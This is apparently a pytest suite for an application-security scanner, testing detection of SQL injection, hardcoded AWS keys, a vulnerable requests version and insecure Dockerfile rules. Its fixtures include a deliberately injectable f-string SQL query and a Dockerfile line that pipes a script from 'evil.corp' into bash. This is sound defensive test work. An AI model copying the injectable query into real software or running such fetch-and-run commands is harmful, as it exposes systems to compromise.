"""
Sentinel AppSec Scanners Unit Test Suite
Tests SASTEngine, SCAEngine, SecretScanner, IaCEngine, APISecEngine, and ThreatModelEngine.
"""

import os
import tempfile
import pytest

from backend.scanners.sast_engine import SASTEngine
from backend.scanners.sca_engine import SCAEngine
from backend.scanners.secret_scanner import SecretScanner
from backend.scanners.iac_engine import IaCEngine
from backend.scanners.api_sec_engine import APISecEngine
from backend.scanners.threat_model_engine import ThreatModelEngine


def test_sast_engine_detects_sqli_and_respects_suppression():
    sast = SASTEngine()

    vulnerable_code = """
import sqlite3
def get_user(db, user_input):
    query = f"SELECT * FROM users WHERE id = '{user_input}'"
    return db.execute(query).fetchall()
"""
    findings = sast.scan_content(vulnerable_code, "app.py", "python")
    assert len(findings) > 0
    assert any(f.get("cwe_id") == "CWE-89" for f in findings)

    # Test inline suppression via sentinel-ignore
    suppressed_code = """
import sqlite3
def get_user(db, user_input):
    query = f"SELECT * FROM users WHERE id = '{user_input}'"  # sentinel-ignore: CWE-89
    return db.execute(query).fetchall()
"""
    suppressed_findings = sast.scan_content(suppressed_code, "app.py", "python")
    assert len(suppressed_findings) == 0


def test_sast_engine_misra_c_heap_allocation():
    sast = SASTEngine()
    c_code = """
#include <stdlib.h>
void* allocate_buffer(size_t sz) {
    return malloc(sz);
}
"""
    findings = sast.scan_content(c_code, "safety.c", "c")
    assert len(findings) > 0
    assert any("MISRA" in f.get("title", "") or f.get("cwe_id") == "CWE-401" for f in findings)


def test_secret_scanner_entropy_and_masking():
    scanner = SecretScanner()

    # AWS Access Key (high entropy)
    content = 'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"'
    findings = scanner.scan_text(content, "config.py")
    assert len(findings) > 0
    f = findings[0]
    assert f.get("cwe_id") == "CWE-798"
    assert "AKIA" in f.get("masked_value", "")
    assert "****" in f.get("masked_value", "")

    # Dummy/placeholder string should not trigger false positive
    dummy_content = 'AWS_KEY = "AKIA0000000000000000"'
    dummy_findings = scanner.scan_text(dummy_content, "config.py")
    assert len(dummy_findings) == 0


def test_sca_engine_reachability_and_manifest_parsing():
    sca = SCAEngine()
    with tempfile.TemporaryDirectory() as tmp_dir:
        # 1. Create requirements.txt with vulnerable lodash / requests
        req_file = os.path.join(tmp_dir, "requirements.txt")
        with open(req_file, "w") as f:
            f.write("requests==2.30.0\n")

        # 2. Source file importing and calling requests
        py_file = os.path.join(tmp_dir, "client.py")
        with open(py_file, "w") as f:
            f.write("import requests\nresp = requests.get('https://example.com')\n")

        result = sca.scan_directory(tmp_dir)
        deps = result.get("dependencies", [])
        findings = result.get("findings", [])

        assert len(deps) >= 1
        assert any(d["name"] == "requests" for d in deps)

        # Requests 2.30.0 has CVE-2023-32681
        assert len(findings) >= 1
        req_finding = next(f for f in findings if f.get("package_name") == "requests")
        assert req_finding.get("reachability") == "REACHABLE"
        assert req_finding.get("cve_id") == "CVE-2023-32681"


def test_iac_engine_dockerfile_rules():
    iac = IaCEngine()
    insecure_dockerfile = """
FROM python:latest
USER root
RUN curl https://evil.corp/install.sh | bash
EXPOSE 22
"""
    findings = iac.scan_content(insecure_dockerfile, "Dockerfile", "dockerfile")
    assert len(findings) >= 2
    rule_ids = [f.get("rule_id") for f in findings]
    assert any("DOCKER" in rid for rid in rule_ids)


def test_threat_model_engine_dfd_and_reconciliation():
    engine = ThreatModelEngine()
    with tempfile.TemporaryDirectory() as tmp_dir:
        # Create a sample python endpoint
        py_file = os.path.join(tmp_dir, "api.py")
        with open(py_file, "w") as f:
            f.write("@app.get('/users/{id}')\ndef get_user(id: str): pass\n")

        res = engine.analyze_repository(tmp_dir, [])
        assert "stride_summary" in res
        assert "components" in res
        assert "data_flow_diagram" in res
        assert res["stride_summary"]["total_threats"] > 0

